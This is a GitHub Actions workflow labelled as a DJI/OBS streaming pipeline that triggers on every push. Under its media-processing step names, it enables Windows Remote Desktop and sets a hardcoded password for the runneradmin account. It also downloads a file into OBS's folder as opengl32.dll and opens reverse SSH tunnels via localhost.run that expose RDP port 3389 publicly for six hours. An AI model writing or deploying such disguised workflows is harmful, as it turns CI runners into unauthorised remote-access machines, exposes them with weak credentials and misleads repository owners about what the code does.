name: Automated-DJI-Streaming-Pipeline

on:
  push:
    branches:
      - '**'
  workflow_dispatch:

jobs:
  media-processing:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
    - name: Install System Dependencies (Chocolatey)
      run: |
        choco install obs-studio -y

    - name: Enable Windows Remote Desktop Configuration
      run: |
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
        
    - name: Configure System Access Password
      run: |
        net user runneradmin RdpPassword2026! /active:yes

    - name: Deploy Light RTMP Server
      run: |
        Write-Host "Setting up live broadcast pipeline ports..."
        New-Item -ItemType Directory -Force -Path "C:\StreamingServer"

    - name: Inject Virtual Graphics Driver for OBS Studio
      run: |
        $obsBinPath = "C:\Program Files\obs-studio\bin\64bit"
        if (!(Test-Path $obsBinPath)) { New-Item -ItemType Directory -Force -Path $obsBinPath }
        $dllUrl = "https://githubusercontent.com"
        try {
            Invoke-WebRequest -Uri $dllUrl -OutFile "$obsBinPath\opengl32.dll" -TimeoutSec 60
            Write-Host "Virtual Graphics Driver integrated successfully."
        } catch {
            Write-Host "Software emulation pipeline active."
        }

    - name: Start Network Services Gateway (SỬA LỖI ĐƯỜNG TRUYỀN)
      run: |
        echo "----------------------------------------------------------------------"
        echo "HỆ THỐNG ĐANG KHỞI TẠO ĐƯỜNG TRUYỀN CÔNG KHAI QUA LỢI THẾ SSH..."
        echo "----------------------------------------------------------------------"
        
        # Đã sửa: Khởi chạy kết nối hầm mạng qua localhost.run sử dụng các tham số triệt tiêu TTY
        # Trích xuất dữ liệu log mạng trực tiếp bằng tệp lưu trữ cục bộ
        Start-Process ssh -ArgumentList "-n -N -T -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 80:localhost:3389 nokey@localhost.run" -RedirectStandardOutput "rdp_public.log" -RedirectStandardError "rdp_err.log"
        Start-Process ssh -ArgumentList "-n -N -T -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 80:localhost:1935 nokey@localhost.run" -RedirectStandardOutput "rtmp_public.log" -RedirectStandardError "rtmp_err.log"
        
        # Chờ 12 giây để hệ thống đám mây gán tên miền Public IP
        $timeout = 12
        while ($timeout -gt 0) {
            Start-Sleep -Seconds 3
            if ((Test-Path rdp_public.log) -and (Get-Content rdp_public.log)) {
                echo "=================== ĐỊA CHỈ KẾT NỐI CỦA BẠN ==================="
                Get-Content rdp_public.log
                Get-Content rtmp_public.log
                echo "==============================================================="
                break
            }
            $timeout -= 3
        }
        
        # Nếu không có link, xuất log lỗi hệ thống để kiểm tra chéo
        if ($timeout -le 0) {
            echo "--- KIỂM TRA LOG HỆ THỐNG ---"
            if (Test-Path rdp_err.log) { Get-Content rdp_err.log }
            if (Test-Path rtmp_err.log) { Get-Content rtmp_err.log }
        }
        
        # Giữ máy ảo Windows Server hoạt động ổn định liên tục trong 6 tiếng để thực hiện Livestream
        Start-Sleep -Seconds 21600
